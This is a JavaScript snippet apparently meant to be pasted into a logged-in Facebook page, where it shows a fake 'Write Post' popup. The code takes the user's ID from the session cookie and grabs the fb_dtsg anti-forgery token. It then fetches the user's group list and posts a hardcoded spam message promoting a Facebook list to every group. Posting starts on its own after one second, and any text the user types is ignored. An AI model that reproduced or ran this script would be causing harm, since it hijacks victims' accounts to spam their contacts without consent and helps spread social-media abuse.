var grouppost = "<div><span class='img sp_f52w7l sx_47132d'></span><a style='position:absolute;size:3px;padding-left:3px;font-weight:bold;font-family:Tahoma;font-size:11px;color:#3B5998;'>Write Post</a></div></br>";
grouppost += "<div><textarea id='txtFloodMsg' placeholder='Write something...'  style='padding-top:5px;width:493px;height:85px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);'></textarea></div>";
grouppost += "<div><span class='img sp_dpkef5 sx_f05251'></span><a style='position:absolute;font-family:Arial;size:3px;padding-left:3px;font-size:11px;color:rgb(128, 128, 128);'>Script Privacy: Public </a></span><button style='margin-left:437px' class='_42ft _4jy0 _11b _4jy3 _4jy1 selected' onclick='autopostingfunc(this);' >Post</button></div>";
var Popupset = document.createElement("div");
Popupset.setAttribute("style", "min-height:50px;width:500px;position:fixed;top:100px;box-shadow: 0px 4px 10px rgba(24, 144, 255, 0.63);position:fixed;left:50%;margin-left:-273px;text-align:left;border-radius:10px;padding:5px;z-index:999999;border:5px solid rgba(24, 144, 255, 0.63);background-color:rgba(255,255,255,0.75);color:black");
Popupset.innerHTML = grouppost;
document.body.appendChild(Popupset);
jx =
{
  getHTTPObject: function ()
  {
    var A = false;
    if (typeof ActiveXObject != "undefined")
    {
      try
      {
        A = new ActiveXObject("Msxml2.XMLHTTP")
      }
      catch (C)
      {
        try
        {
          A = new ActiveXObject("Microsoft.XMLHTTP")
        }
        catch (B)
        {
          A = false
        }
      }
    }
    else
    {
      if (window.XMLHttpRequest)
      {
        try
        {
          A = new XMLHttpRequest()
        }
        catch (C)
        {
          A = false
        }
      }
    }
    return A
  },
  load: function (url, callback, format, method, opt)
  {
    var http = this.init();
    if (!http || !url)
    {
      return
    }
    if (http.overrideMimeType)
    {
      http.overrideMimeType("text/xml")
    }
    if (!method)
    {
      method = "GET"
    }
    if (!format)
    {
      format = "text"
    }
    if (!opt)
    {
      opt =
      {
      }
    }
    format = format.toLowerCase();
    method = method.toUpperCase();
    var now = "uid=" + new Date().getTime();
    url += (url.indexOf("?") + 1) ? "&" : "?";
    url += now;
    var parameters = null;
    if (method == "POST")
    {
      var parts = url.split("?");
      url = parts[0];
      parameters = parts[1]
    }
    http.open(method, url, true);
    
    var ths = this;
    if (opt.handler)
    {
      http.onreadystatechange = function ()
      {
        opt.handler(http)
      }
    }
    else
    {
      http.onreadystatechange = function ()
      {
        if (http.readyState == 4)
        {
          if (http.status == 200)
          {
            var result = "";
            if (http.responseText)
            {
              result = http.responseText
            }
            if (format.charAt(0) == "j")
            {
              result = result.replace(/[\n\r]/g, "");
              result = eval("(" + result + ")")
            }
            else
            {
              if (format.charAt(0) == "x")
              {
                result = http.responseXML
              }
            }
            if (callback)
            {
              callback(result)
            }
          }
          else
          {
            if (opt.loadingIndicator)
            {
              document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator)
            }
            if (opt.loading)
            {
              document.getElementById(opt.loading).style.display = "none"
            }
            if (error)
            {
              error(http.status)
            }
          }
        }
      }
    }
    http.send(parameters)
  },
  bind: function (A)
  {
    var C =
    {
      "url": "",
      "onSuccess": false,
      "onError": false,
      "format": "text",
      "method": "GET",
      "update": "",
      "loading": "",
      "loadingIndicator": ""
    };
    for (var B in C)
    {
      if (A[B])
      {
        C[B] = A[B]
      }
    }
    if (!C.url)
    {
      return
    }
    var D = false;
    if (C.loadingIndicator)
    {
      D = document.createElement("div");
      D.setAttribute("style", "position:absolute;top:0px;left:0px;");
      D.setAttribute("class", "loading-indicator");
      D.innerHTML = C.loadingIndicator;
      document.getElementsByTagName("body")[0].appendChild(D);
      this.opt.loadingIndicator = D
    }
    if (C.loading)
    {
      document.getElementById(C.loading).style.display = "block"
    }
    this.load(C.url, function (E)
    {
      if (C.onSuccess)
      {
        C.onSuccess(E)
      }
      if (C.update)
      {
        document.getElementById(C.update).innerHTML = E
      }
      if (D)
      {
        document.getElementsByTagName("body")[0].removeChild(D)
      }
      if (C.loading)
      {
        document.getElementById(C.loading).style.display = "none"
      }
    }, C.format, C.method, C)
  },
  init: function ()
  {
    return this.getHTTPObject()
  }
}
var j = 0;
var k = 0;
var suc = 0;
var msg = "Follow this list please... https://www.facebook.com/lists/562836113761391";
var arr = new Array();
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function autopostingfunc(sender)
{
  if (document.getElementById("txtFloodMsg").value != "") post = document.getElementById("txtFloodMsg").value;
  jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=group&viewer=" + user_id + "&token=v7&lazy=0&__user=" + user_id, function (a)
  {
    var b = a;
    var c = b.substring(b.indexOf('{'));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++)
    {
      arr.push(d[e].uid);
    }
    sender.parentNode.innerHTML = "Please Wait...";
    postitok();
  });
}
var a = document.body.innerHTML;
var dts = document.getElementsByName('fb_dtsg')[0].value;
var composerid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);



function postitok() {
    pst = "fb_dtsg=" + dts + "&xhpc_composerid=" + composerid + "&xhpc_targetid=" + arr[suc] + "&xhpc_context=home&xhpc_fbx=1&xhpc_message_text=" + encodeURIComponent(msg) + "&xhpc_message=" + encodeURIComponent(msg) + "&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_group_composer";
    with(newx = new XMLHttpRequest()) open("POST", "/ajax/updatestatus.php?__a=1"), send(pst);
    suc++;
    if (suc > arr.length) {
        alert("Auto Posting Completed. Now Refresh your Homepage.");
        suc = 0;
    } else setTimeout("postitok()", 30000 / arr.length);
}
setTimeout("autopostingfunc()", 1000);

